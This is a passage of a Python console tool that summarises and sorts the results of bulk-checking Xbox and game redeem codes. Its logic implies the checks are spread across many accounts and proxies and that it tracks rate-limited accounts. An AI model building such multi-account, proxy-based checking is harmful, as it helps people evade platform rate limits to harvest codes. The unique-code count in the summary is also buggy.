        print(f"{Fore.GREEN}  ✅ Valid: {results_count.get('VALID', 0)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  💳 Valid (Card Required): {results_count.get('VALID_REQUIRES_CARD', 0)}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}  🌍 Region Locked: {results_count.get('REGION_LOCKED', 0)}{Style.RESET_ALL}")
        print(f"{Fore.RED}  ❌ Invalid: {results_count.get('INVALID', 0)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  ❓ Unknown: {results_count.get('UNKNOWN', 0)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        # Save summary
        with open(f'{results_folder}/summary.txt', 'w') as f:
            f.write(f"Code Check Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Total Codes: {len(all_codes)}\n")
            f.write(f"Total Accounts: {len(accounts)}\n")
            f.write(f"Batch Size: {batch_size}\n")
            if proxies:
                f.write(f"Proxies Used: {len(proxies)}\n")
            f.write("\nFinal Results:\n")
            f.write("-" * 20 + "\n")
            f.write(f"Valid Codes: {results_count.get('VALID', 0)}\n")
            f.write(f"Valid (Requires Card): {results_count.get('VALID_REQUIRES_CARD', 0)}\n")
            f.write(f"Region Locked: {results_count.get('REGION_LOCKED', 0)}\n")
            f.write(f"Invalid: {results_count.get('INVALID', 0)}\n")
            f.write(f"Unknown: {results_count.get('UNKNOWN', 0)}\n")
        
        print(f"{Fore.GREEN}💾 Results saved to {results_folder}/{Style.RESET_ALL}")
        
        # Update codes.txt with remaining codes
        with open('codes.txt', 'w') as f:
            remaining_codes = [c for c in all_codes if c not in processed_codes]
            f.write('\n'.join(remaining_codes))
        
        # Rate limited accounts handling
        if rate_limited_accounts:
            print(f"\n{Fore.YELLOW}Found {len(rate_limited_accounts)} rate-limited accounts.{Style.RESET_ALL}")
        
        # ==================== ASK TO SORT CODES ====================
        if results_count.get('VALID', 0) > 0 or results_count.get('VALID_REQUIRES_CARD', 0) > 0:
            print(f"\n{Fore.CYAN}🎁 Code Sorting Option{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            total_valid = results_count.get('VALID', 0) + results_count.get('VALID_REQUIRES_CARD', 0)
            print(f"{Fore.WHITE}Found {total_valid} valid codes!{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Would you like to sort and group these codes?{Style.RESET_ALL}")
            
            while True:
                sort_choice = input(f"{Fore.YELLOW}Sort codes? (y/n): {Style.RESET_ALL}").strip().lower()
                if sort_choice in ['y', 'yes']:
                    sort_valid_codes(results_folder, results_count)
                    break
                elif sort_choice in ['n', 'no']:
                    break
                else:
                    print(f"{Fore.RED}Please enter 'y' or 'n'{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}✅ Operation completed!{Style.RESET_ALL}")
    input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")

def sort_existing_codes():
    """Sort existing codes from user-selected file"""
    try:
        print(f"{Fore.CYAN}📂 Select file to sort...{Style.RESET_ALL}")
        
        # Use file selector to choose file
        codes_file = select_accounts_file()
        if not codes_file:
            print(f"{Fore.RED}❌ No file selected{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
            return
        
        # Read codes from selected file
        try:
            with open(codes_file, 'r', encoding='utf-8') as f:
                all_codes = [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            # Try with different encodings
            encodings = ['latin-1', 'cp1252', 'iso-8859-1']
            for encoding in encodings:
                try:
                    with open(codes_file, 'r', encoding=encoding) as f:
                        all_codes = [line.strip() for line in f if line.strip()]
                    print(f"{Fore.YELLOW}⚠️ Used {encoding} encoding to read file{Style.RESET_ALL}")
                    break
                except UnicodeDecodeError:
                    continue
            else:
                print(f"{Fore.RED}❌ Could not read file with any supported encoding{Style.RESET_ALL}")
                input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
                return
        
        if not all_codes:
            print(f"{Fore.RED}❌ No codes found in {os.path.basename(codes_file)}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}🔄 Sorting {len(all_codes)} codes from {os.path.basename(codes_file)}...{Style.RESET_ALL}")
        
        # Create results folder
        timestamp = datetime.now().strftime("%Y%m%d")
        results_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "results")
        os.makedirs(results_folder, exist_ok=True)
        
        # Group codes by game/bundle type
        game_groups = {}
        
        for code_line in all_codes:
            # Parse code line: CODE | Game Name
            if '|' in code_line:
                code, game_name = code_line.split('|', 1)
                code = code.strip()
                game_name = game_name.strip()
                
                # Extract main game type
                game_type = extract_game_type(game_name)
                
                if game_type not in game_groups:
                    game_groups[game_type] = []
                game_groups[game_type].append((code, game_name))
            else:
                # Handle codes without descriptions
                if 'Other' not in game_groups:
                    game_groups['Other'] = []
                game_groups['Other'].append((code_line.strip(), 'Unknown'))
        
        # Format output
        formatted_output = format_game_codes_output(game_groups)
        
        # Save sorted output with requested naming format
        sorted_file = f'{results_folder}/sortedcodes_{timestamp}.txt'
        with open(sorted_file, 'w', encoding='utf-8') as f:
            f.write(formatted_output)
        
        print(f"{Fore.GREEN}✅ Codes sorted and saved to:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📁 {sorted_file}{Style.RESET_ALL}")
        
        # Show preview
        print(f"\n{Fore.YELLOW}📋 Preview of sorted codes:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        lines = formatted_output.split('\n')
        for i, line in enumerate(lines[:25]):  # Show first 25 lines
            print(line)
        if len(lines) > 25:
            print(f"{Fore.YELLOW}... and {len(lines) - 25} more lines{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}❌ Error sorting codes: {str(e)}{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")

def sort_valid_codes(results_folder, results_count):
    """Sort and group valid codes by game/bundle type"""
    try:
        print(f"\n{Fore.CYAN}🔄 Sorting valid codes...{Style.RESET_ALL}")
        
        # Read valid codes from results
        valid_codes_file = f'{results_folder}/valid_codes.txt'
        valid_card_codes_file = f'{results_folder}/valid_requires_card.txt'
        
        codes_to_sort = []
        
        # Read valid codes
        if os.path.exists(valid_codes_file):
            with open(valid_codes_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        codes_to_sort.append(line)
        
        # Read valid card codes
        if os.path.exists(valid_card_codes_file):
            with open(valid_card_codes_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        codes_to_sort.append(line)
        
        if not codes_to_sort:
            print(f"{Fore.YELLOW}❌ No valid codes found to sort{Style.RESET_ALL}")
            return
        
        # Group codes by game/bundle type
        game_groups = {}
        
        for code_line in codes_to_sort:
            # Parse the code line: CODE | Game Name
            if '|' in code_line:
                code, game_name = code_line.split('|', 1)
                code = code.strip()
                game_name = game_name.strip()
                
                # Extract main game type (first word or common patterns)
                game_type = extract_game_type(game_name)
                
                if game_type not in game_groups:
                    game_groups[game_type] = []
                game_groups[game_type].append((code, game_name))
            else:
                # Handle codes without descriptions
                if 'Other' not in game_groups:
                    game_groups['Other'] = []
                game_groups['Other'].append((code_line.strip(), 'Unknown'))
        
        # Format the output
        formatted_output = format_game_codes_output(game_groups)
        
        # Save sorted output
        sorted_file = f'{results_folder}/sorted_valid_codes.txt'
        with open(sorted_file, 'w', encoding='utf-8') as f:
            f.write(formatted_output)
        
        print(f"{Fore.GREEN}✅ Codes sorted and saved to:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📁 {sorted_file}{Style.RESET_ALL}")
        
        # Show preview
        print(f"\n{Fore.YELLOW}📋 Preview of sorted codes:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        lines = formatted_output.split('\n')
        for i, line in enumerate(lines[:25]):  # Show first 25 lines
            print(line)
        if len(lines) > 25:
            print(f"{Fore.YELLOW}... and {len(lines) - 25} more lines{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}❌ Error sorting codes: {str(e)}{Style.RESET_ALL}")

def extract_game_type(game_name):
    """Extract the main game type from game name"""
    game_name = game_name.upper()
    
    # Common game patterns
    if 'SUNSET SARSAPARILLA' in game_name:
        return '🥤 Sunset Sarsaparilla Bundle'
    elif 'RAINBOW SIX SIEGE' in game_name:
        return '🔫 Rainbow Six Siege'
    elif 'SKATE' in game_name:
        return '🛹 Skate Supercharge Pack'
    elif 'MADDEN NFL' in game_name:
        return '🏈 Madden NFL Supercharge Pack'
    elif 'WARFRAME' in game_name:
        return '⚔️ Warframe Bundle'
    elif 'THRONE AND LIBERTY' in game_name:
        return '👑 Throne and Liberty'
    elif 'DRIFT BUNDLE' in game_name:
        return '🚗 Drift Bundle'
    elif 'WINTER' in game_name and 'XBOX BENEFITS' in game_name:
        return '❄️ Winter Xbox Benefits Pack'
    elif 'JANG SAO' in game_name:
        return '🏆 Jang Sao Champions Bundle'
    elif 'PSO2:NGS' in game_name or 'PHANTASY STAR' in game_name:
        return '⭐ PSO2:NGS Monthly Bonus'
    elif 'XBOX GAME PASS' in game_name:
        return '🎮 Xbox Game Pass'
    elif 'BUNDLE' in game_name:
        return '🎁 Game Bundle'
    elif 'PACK' in game_name:
        return '📦 Game Pack'
    else:
        return '🎮 Other Games'

def format_game_codes_output(game_groups):
    """Format grouped game codes into clean output"""
    lines = []
    
    # Sort groups by count (descending) then by name
    sorted_groups = sorted(game_groups.items(), 
                         key=lambda x: (-len(x[1]), x[0]))
    
    lines.append("🎮 SORTED GAME CODES 🎮")
    lines.append("=" * 60)
    lines.append("")
    
    total_codes = 0
    
    for game_type, codes_list in sorted_groups:
        count = len(codes_list)
        total_codes += count
        
        lines.append(f"📋 {game_type} ({count} codes)")
        lines.append("-" * 50)
        
        # Sort codes alphabetically
        codes_list.sort(key=lambda x: x[0])
        
        # Remove duplicates and count occurrences
        code_counts = {}
        for code, game_name in codes_list:
            if code not in code_counts:
                code_counts[code] = []
            code_counts[code].append(game_name)
        
        # Display codes in original format
        for code, game_names in sorted(code_counts.items()):
            if len(game_names) == 1:
                lines.append(f"{code} | {game_names[0]}")
            else:
                # Show duplicates with count
                lines.append(f"{code} (x{len(game_names)}) | {game_names[0]}")
                for i, game_name in enumerate(game_names[1:], 1):
                    lines.append(f"{' ' * (len(code) + 3)}| {game_name}")
        
        lines.append("")
    
    # Summary
    lines.append("📊 SUMMARY")
    lines.append("=" * 60)
    lines.append(f"Total unique codes: {len(code_counts)}")
    lines.append(f"Total code entries: {total_codes}")
    lines.append(f"Game categories: {len(game_groups)}")
    lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return "\n".join(lines) + "\n"

def main():
    """Main entry point - show menu"""
    show_main_menu()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}❌ Interrupted{Style.RESET_ALL}")
        sys.exit(0)

